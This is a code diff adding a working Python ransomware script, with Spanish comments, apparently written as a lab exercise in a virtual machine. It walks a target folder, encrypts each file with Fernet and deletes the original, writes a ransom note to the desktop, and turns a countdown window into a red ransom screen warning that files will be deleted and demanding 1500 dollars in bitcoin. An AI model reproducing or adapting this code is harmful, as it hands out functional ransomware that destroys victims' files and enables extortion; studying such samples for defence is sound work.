@@ -1,10 +1,174 @@
+from cryptography.fernet import Fernet
+import os
+import sys
+import tkinter as tk
+import customtkinter as ctk
+from PIL import Image, ImageTk
+
+if getattr(sys, "frozen", False):
+    BASE_DIR = os.path.dirname(sys.executable)
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+KEY_FILE = os.path.join(BASE_DIR, "key.key")
+
+# TARGET_FOLDER = os.path.expanduser("~")
+TARGET_FOLDER = "/home/vboxuser/Documents/archivos_importantes"
+
+EXCLUDE_ROUTE = "/home/vboxuser/Documents/ransom"
+
+def load_key():
+    # Carga la clave desde key.key
+    with open(KEY_FILE, "rb") as file:
+        return file.read()
+
+
+def encrypt_file(file_path, cipher):
+    #Cifra un archivo individual
+
+    # Leer contenido original
+    with open(file_path, "rb") as file:
+        data = file.read()
+
+    # Cifrar contenido
+    encrypted_data = cipher.encrypt(data)
+
+    # Guardar archivo cifrado
+    encrypted_path = file_path + ".encrypted"
+
+    with open(encrypted_path, "wb") as file:
+        file.write(encrypted_data)
+
+    # Eliminar el original
+    os.remove(file_path)
+
+    print(f"Cifrado: {file_path}")
+
+
+def encrypt_folder(folder_path, cipher):
+    # Recorre la carpeta y cifra los archivos
+
+    for root, directories, files in os.walk(folder_path):
+
+        if os.path.abspath(root).startswith(EXCLUDE_ROUTE):
+            continue
+
+        for file in files:
+
+            file_path = os.path.join(root, file)
+
+            # Evitar cifrar archivos ya cifrados
+            if not file.endswith(".encrypted"):
+                encrypt_file(file_path, cipher)
+
+
+if __name__ == "__main__":
+
+    # Verificar existencia de la clave
+    if not os.path.exists(KEY_FILE):
+        print("No existe key.key. Primero genera la clave.")
+        exit()
+
+    # Verificar carpeta
+    if not os.path.exists(TARGET_FOLDER):
+        print("La carpeta indicada no existe.")
+        exit()
+
+
+    key = load_key()
+
+    cipher = Fernet(key)
+
+    encrypt_folder(TARGET_FOLDER, cipher)
+
+    print("\nProceso terminado.")
+
+# Obtener la ruta del escritorio
+desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+
+# Nombre y ruta del archivo
+file_path = os.path.join(desktop, "README_RANS.txt")
+
+# Crear el archivo y escribir contenido
+with open(file_path, "w", encoding="utf-8") as file:
+    file.write("TU CARPETA HA SIDO ENCRIPTADA.\n")
+    file.write("SIGUE LAS INSTRUCCIONES PARA RECUPERAR TUS ARCHIVOS.\n")
+
+print(f"Archivo creado correctamente en: {file_path}")
+
+
+# Interfaz grafica
+
+# Configuración de apariencia
+ctk.set_appearance_mode("dark")
+
+# Ventana principal
+app = ctk.CTk()
+
+app.geometry("800x500")
+app.title("Mi aplicación")
+
+# Fondo rojo
+app.configure(fg_color="#b30000")
+
+
+# -------------------------------
+# Barra superior negra
+# -------------------------------
+
+barra_superior = ctk.CTkFrame(
+    app,
+    height=100,
+    fg_color="black",
+    corner_radius=0
+)
+
+barra_superior.pack(
+    fill="x",
+    side="top"
+)
+
+
+# Imagen
+imagen = Image.open("images.png")
+imagen = imagen.resize((70,70))
+
+imagen_tk = ImageTk.PhotoImage(imagen)
+
+label_imagen = ctk.CTkLabel(
+    barra_superior,
+    image=imagen_tk,
+    text=""
+)
+
+label_imagen.pack(
+    side="left",
+    padx=20,
+    pady=15
+)
+
+
+# Texto al lado de la imagen
+
+texto = ctk.CTkLabel(
+    barra_superior,
+    text="OOOPS, TUS ARCHIVOS HAN SIDO ENCRIPTADOS",
+    font=("Arial", 28),
+    text_color="white"
+)
+
+texto.pack(
+    side="left",
+    padx=10
+)
+
 # -------------------------------
 # Texto central
 # -------------------------------
 
 texto_centro = ctk.CTkLabel(
     app,
-    text="Este es un contador",
+    text="TUS ARCHIVOS SERAN ELIMINADOS",
     font=("Arial", 30),
     text_color="white"
 )
@@ -54,3 +218,23 @@ def actualizar_contador():
 
 
 actualizar_contador()
+
+# -------------------------------
+# Parte inferior
+# -------------------------------
+
+pie = ctk.CTkLabel(
+    app,
+    text="PAGA AQUI 1500$ EQUIVALENTES A BITCOIN XXXXXXXXX",
+    font=("Arial", 20),
+    text_color="white"
+)
+
+pie.pack(
+    side="bottom",
+    pady=20
+)
+
+
+# Ejecutar
+app.mainloop()
